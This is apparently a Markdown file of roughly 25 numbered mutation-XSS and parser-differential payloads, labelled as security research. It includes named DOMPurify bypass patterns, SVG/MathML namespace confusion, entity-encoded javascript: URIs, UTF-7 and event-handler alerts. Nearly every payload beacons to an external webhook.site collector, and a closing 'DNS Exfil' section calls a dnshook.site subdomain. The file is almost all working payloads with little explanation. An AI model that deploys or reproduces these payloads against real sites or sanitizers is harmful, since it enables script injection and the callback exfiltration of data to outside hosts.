# Security Research - v42

## Mutation XSS (mXSS) & Parser Differentials

Testing advanced mXSS techniques exploiting parser differences.

---

### 1) SVG Foreign Object mXSS

<svg><foreignobject><![CDATA[<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-fo.gif">]]></foreignobject></svg>

<svg><foreignobject><body><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-fo-body.gif"></body></foreignobject></svg>

---

### 2) MathML Foreign mXSS

<math><mtext><table><mglyph><style><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/math-mtext.gif">

<math><annotation-xml encoding="text/html"><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/math-annotation.gif"></annotation-xml></math>

---

### 3) Noscript Context Escape

<noscript><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noscript-img.gif"></noscript>

<noscript><link rel="stylesheet" href="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noscript-css.css"></noscript>

<noscript></noscript><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-noscript.gif">

---

### 4) Title/Textarea Parser Bypass

<title><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/title.gif"></title>

<textarea><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/textarea.gif"></textarea>

<title></title><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-title.gif">

---

### 5) NoEmbed/NoFrames Context

<noembed><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noembed.gif"></noembed>

<noframes><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/noframes.gif"></noframes>

---

### 6) Raw Text Elements Breakout

<script><</script><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/script-break.gif">

<style><</style><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/style-break.gif">

---

### 7) Table-Based mXSS

<table><tr><caption><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/table-caption.gif"></caption></tr></table>

<table><colgroup><col><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/table-col.gif"></colgroup></table>

<table><tbody><math><mtext><h1><a href="javascript:alert(1)">mXSS</a></h1></mtext></math></tbody></table>

---

### 8) Select/Option mXSS

<select><option><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/select-option.gif"></option></select>

<select><option></option></select><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/after-select.gif">

---

### 9) DOMPurify Bypass Patterns

<form><math><mtext></form><form><mglyph><style></math><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/domclobber1.gif">

<svg><animate href="#x" attributeName="href" values="javascript:alert(1)"></animate><a id="x"><text>Click</text></a></svg>

---

### 10) Namespace Confusion

<svg><p><style><g title="</style><img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/ns-confusion.gif'>

<svg><![CDATA[<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/svg-cdata.gif">]]></svg>

---

### 11) Comment-Based mXSS

<!--><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment1.gif">-->

<!--<img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment2.gif">--!>

<comment><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/comment-tag.gif"></comment>

---

### 12) Entity Decoding After Parse

<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">Entity XSS</a>

<a href="&Tab;javascript&colon;alert(1)">Tab entity</a>

<a href="java&NewLine;script:alert(1)">Newline entity</a>

---

### 13) UTF-7 BOM Injection

<a href="+ADw-script+AD4-alert(1)+ADw-/script+AD4-">UTF-7</a>

+ADw-img src=x onerror=alert(1)+AD4-

---

### 14) Closing Tag Confusion

<p/onclick="alert(1)">Click P</p>

<img/src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/slash-img.gif"/onerror="alert(1)">

<input/onfocus="alert(1)" autofocus>

---

### 15) Nested Template Exploit

<template><template><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/nested-template.gif"></template></template>

<template id="t"><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/template-id.gif"></template>

---

### 16) Ruby Tag Bypass

<ruby><rb>test</rb><rp><img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/ruby.gif"></rp><rt></rt></ruby>

---

### 17) Object/Param mXSS

<object><param name="movie" value="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/param.swf"></object>

---

### 18) Keygen Element (Legacy)

<keygen name="test" onfocus="alert(1)" autofocus>

---

### 19) Menu/MenuItem (Legacy)

<menu><menuitem onclick="alert(1)">Click</menuitem></menu>

---

### 20) Command Element (Legacy)

<command onclick="alert(1)">Command</command>

---

### 21) ContentEditable XSS

<div contenteditable="true" onblur="alert(1)">Edit me</div>

<span contenteditable onkeydown="alert(1)">Type here</span>

---

### 22) Design Mode

<iframe srcdoc="<img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/srcdoc.gif'>"></iframe>

---

### 23) Picture Source mXSS

<picture>
  <source media="(min-width: 0px)" srcset="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/picture-source.gif">
  <img src="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/picture-img.gif">
</picture>

---

### 24) Object Data URI

<object data="data:text/html,<img src='https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/object-data.gif'>"></object>

---

### 25) Processing Instruction

<?xml-stylesheet href="https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/pi.css"?>

---

### DNS Exfil

![DNS](https://v42-dns.d62bdb5c-7bf6-46b6-b997-4cb10a584777.dnshook.site/dns.gif)

### Canary

![Canary](https://webhook.site/d62bdb5c-7bf6-46b6-b997-4cb10a584777/v42-canary.gif)

---

*v42 - Mutation XSS & parser differentials*
